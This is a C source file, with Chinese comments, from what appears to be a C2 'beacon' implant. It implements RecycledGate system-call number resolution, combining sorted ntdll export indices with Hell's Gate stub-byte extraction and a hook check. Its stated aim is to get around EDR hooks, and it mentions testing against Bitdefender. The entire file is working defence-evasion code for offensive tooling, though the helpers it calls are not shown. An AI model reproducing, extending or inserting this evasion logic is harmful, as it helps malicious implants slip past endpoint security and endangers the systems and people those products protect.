#include "beacon_syscall_internal.h"

/*
 * recycled_gate.c -- RecycledGate SSN 解析（默认链链首）。
 *
 * 交叉验证（参考 D:\code\Vs2022\syscall\RecycledGate\RecycledGate.cpp）：
 *  - sortSsn：排序导出表下标（FreshyCalls 排序索引，永不失败的保底）；
 *  - opcodeSsn：目标 stub 入口特征字节提取（Hell's Gate）；
 *  - 决策矩阵：
 *      opcode == sort         → 信 sort（confirmed，高置信）
 *      opcode != sort 且干净  → 信 opcode（stub 字节可信）
 *      opcode != sort 且 hook → 信 sort（字节被改，排序保底）
 *      无 opcode              → 信 sort（特征被覆盖，排序兜底）
 *
 * 与参考工程的区别：参考的 RecycledGate.cpp 收集 Nt* 导出时未过滤伪 Nt 导出
 * （NtdllDefWindowProc 等），存在排序偏移 bug；本实现复用 gate_common 的
 * IsLikelyNtSyscallName 过滤缓存，排序索引无偏移。
 */

static BOOL RecycledInit(VOID)
{
    return GateInitCache();
}

static BOOL RecycledResolve(UINT32 func_id, PUINT32 ssn_out)
{
    const GateExport* exports;
    UINT32 count;
    LONG myIdx;
    UINT32 sortSsn;
    UINT32 opcodeSsn;
    BOOL hasOpcode;
    UINT32 chosen;
    const CHAR* reason;

    if (func_id >= SYSCALL_NT_COUNT || !ssn_out) return FALSE;

    exports = GateGetExports(&count);
    if (!exports || count == 0) return FALSE;

    myIdx = GateFindByHash(GateHashName(g_syscall_apis[func_id].name));
    if (myIdx < 0) return FALSE;

    sortSsn = (UINT32)myIdx;
    hasOpcode = GateExtractSsn((PBYTE)exports[myIdx].Address, &opcodeSsn);

    if (hasOpcode) {
        if (opcodeSsn == sortSsn) {
            chosen = sortSsn;
            reason = "confirmed";
        } else if (!GateIsHooked((PBYTE)exports[myIdx].Address)) {
            chosen = opcodeSsn;
            reason = "opcode wins (stub clean)";
        } else {
            chosen = sortSsn;
            reason = "sort wins (stub hooked)";
        }
    } else {
        chosen = sortSsn;
        reason = "sort only (no opcode)";
    }

    /* 决策分支日志（Debug 构建可见，Bitdefender 环境排查用） */
    DebugPrintf("[syscall] recycled %-30s sort=%lu opcode=%lu -> chosen=%lu (%s)\n",
                g_syscall_apis[func_id].name,
                (ULONG)sortSsn, hasOpcode ? (ULONG)opcodeSsn : 0,
                (ULONG)chosen, reason);

    *ssn_out = chosen;
    return TRUE;
}

const SyscallProviderOps g_syscall_provider_recycled_gate = {
    "recycled_gate",
    RecycledInit,
    RecycledResolve,
    NULL
};
